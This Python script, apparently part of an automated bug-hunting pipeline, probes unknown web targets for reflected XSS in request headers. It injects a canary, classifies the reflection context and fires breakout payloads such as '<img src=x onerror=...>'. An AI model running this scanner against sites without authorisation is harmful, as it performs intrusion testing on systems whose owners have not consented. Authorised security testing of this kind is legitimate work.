#!/usr/bin/env python3
"""Generic reflected-XSS probe for HEADER sinks on UNKNOWN targets.

Rule #82 (PART 1): the generic sink set covers query, form, xml,
cookie and json sinks — but zero coverage for request-HEADER sinks
(User-Agent / Referer / X-Forwarded-For echoed into the page: "your
browser" pages, debug footers, analytics snippets). A real human
hunter changes their UA to check. This probe takes the sink spec from
its marker argv (the loop encodes it there so _probe_cmd needs no
changes):

    MARKER = PLOOP82|<target_base>|<path>|GET|<header_csv>

Only GET is accepted (header sinks are read requests; a non-GET
marker fails closed). Header names are validated up front
([A-Za-z0-9-]{1,40}) — one bad name fails the whole probe closed.

Flow (stdlib only):
  1. GET the sink page with benign headers (confirms it exists,
     read-only; the baseline body is the negative control).
  2. REFLECTION TEST per header: control request (benign value) then
     a request with the header set to a markup token
     (GX82R<b>QZ + marker suffix). Raw token in the canary body but
     absent from the control body -> candidate. HTML-escaped only ->
     negative control, keep looking.
  3. CONTEXT CLASSIFICATION (Rule #59 vocabulary): where the raw
     token lands (text/attr-dq/attr-sq/comment/...) -> matching
     breakout payload.
  4. CONFIRMATION: fire the context-specific executable-shaped
     payload (G82P + marker suffix). Raw reflection of the full
     payload == context breakout == CONFIRMED. The EVIDENCE line
     mirrors the Rule #73 vocabulary:
       sink= method=GET header=<name> via=<context>
       payload reflected UNESCAPED

One self-contained reproducible command, fixed marker from argv, own
VERDICT line (probe lesson, 29 Oct). Any exception -> PROBE_ERROR +
VERDICT: FAILED (fail-closed).
"""
import html
import os
import re
import sys
import urllib.parse
import urllib.request

TIMEOUT = 15
HDR_RE = re.compile(r"^[A-Za-z0-9-]{1,40}$")
DEFAULT_HEADERS = ("User-Agent", "Referer", "X-Forwarded-For")


def _fetch(url, headers):
    req = urllib.request.Request(url, headers=dict(headers))
    with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
        return r.getcode(), r.read().decode("utf-8", "replace")


def _classify_context(body, token):
    """Same grounded classifier as probe_sink_xss (Rule #59/#60)."""
    idx = body.find(token)
    if idx < 0:
        return None
    before = body[:idx]
    last_open = before.rfind("<!--")
    if last_open != -1 and "-->" not in before[last_open:]:
        return "comment"
    lt = before.rfind("<")
    if lt != -1 and ">" not in before[lt:idx]:
        tag_tail = before[lt:]
        if re.search(r'=\s*"[^"]*$', tag_tail):
            return "attr-dq"
        if re.search(r"=\s*'[^']*$", tag_tail):
            return "attr-sq"
        if re.search(r"=\s*[^\s>\"']*$", tag_tail):
            return "attr-unquoted"
        return "tag-unknown"
    ls = before.lower().rfind("<script")
    if ls != -1 and "</script" not in before[ls:].lower():
        tail = before.rstrip()
        if tail.endswith('"'):
            return "js-dq"
        if tail.endswith("'"):
            return "js-sq"
        return "js-unknown"
    lst = before.lower().rfind("<style")
    if lst != -1 and "</style" not in before[lst:].lower():
        return "style"
    return "text"


def _confirm_payload(context, msuffix, nonce):
    p = "G82P" + nonce + msuffix
    return {
        "text": p + "<img src=x onerror=" + p + ">",
        "attr-dq": p + '" onGX82over="1',
        "attr-sq": p + "' onGX82over='1",
        "attr-unquoted": p + ' onGX82over="1',
        "js-dq": p + '";G82C//',
        "js-sq": p + "';G82C//",
        "comment": p + "-->",
        "style": p + "</style><img src=x onerror=" + p + ">",
    }.get(context)


def main():
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP82"
    try:
        _, tb_q, path_q, method, headers_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    method = (method or "GET").upper()
    headers = [h for h in headers_csv.split(",") if h]
    if not tb or not path.startswith("/") or not headers or method != "GET":
        print("PROBE_ERROR invalid sink spec (header sinks are GET-only)")
        print("VERDICT: FAILED")
        return
    if not all(HDR_RE.match(h) for h in headers):
        print("PROBE_ERROR bad header name in marker (fail-closed)")
        print("VERDICT: FAILED")
        return
    msuffix = re.sub(r"[^A-Za-z0-9]", "", marker.split("|", 1)[0])[:12]
    # Rule #81: run-unique canary so the executor's reconfirm re-run is
    # an INDEPENDENT confirmation, not a replay of run 1's bytes.
    nonce = os.urandom(3).hex()
    url = tb.rstrip("/") + path
    benign = {"User-Agent": "PLOOP82-benign",
              "Referer": "http://localhost/benign",
              "X-Forwarded-For": "127.0.0.1"}

    # 1. sink page must exist (read-only) -> also the negative control
    try:
        code, control_body = _fetch(url, benign)
    except Exception as e:
        print("PROBE_ERROR sink page fetch failed: %s" % e)
        print("VERDICT: FAILED")
        return
    if code != 200:
        print("PROBE_ERROR sink page status %s" % code)
        print("VERDICT: FAILED")
        return

    # 2. reflection test, one header at a time
    vuln_header = None
    vuln_body = None
    for header in headers:
        token = "GX82R%s%s<b>QZ" % (nonce, msuffix)
        probe_headers = dict(benign)
        probe_headers[header] = token
        try:
            _, body = _fetch(url, probe_headers)
        except Exception as e:
            print("PROBE_NOTE header %s submit failed: %s" % (header, e))
            continue
        if token in body and token not in control_body:
            vuln_header = header
            vuln_body = body
            break
        if html.escape(token) in body:
            print("PROBE_NOTE header %s reflects ESCAPED only (negative "
                  "control)" % header)
    if not vuln_header:
        print("VERDICT: FAILED")
        return

    # 3. context classification (Rule #59)
    context = _classify_context(vuln_body, token)
    print("EVIDENCE sink=%s method=GET header=%s reflection=RAW "
          "context=%s marker=%s" % (path, vuln_header, context, msuffix))

    # 4. confirmation with the context-specific breakout payload
    payload = _confirm_payload(context, msuffix, nonce)
    if payload is None:
        print("PROBE_NOTE context %s has no grounded breakout payload "
              "(fail-closed)" % context)
        print("VERDICT: FAILED")
        return
    probe_headers = dict(benign)
    probe_headers[vuln_header] = payload
    try:
        _, body = _fetch(url, probe_headers)
    except Exception as e:
        print("PROBE_ERROR confirm submit failed: %s" % e)
        print("VERDICT: FAILED")
        return
    if payload in body:
        print("EVIDENCE sink=%s method=GET header=%s via=%s payload "
              "reflected UNESCAPED: %s" % (path, vuln_header, context,
                                           payload))
        print("VERDICT: CONFIRMED")
    else:
        print("PROBE_NOTE confirm payload did not reflect raw "
              "(context=%s)" % context)
        print("VERDICT: FAILED")


if __name__ == "__main__":
    main()
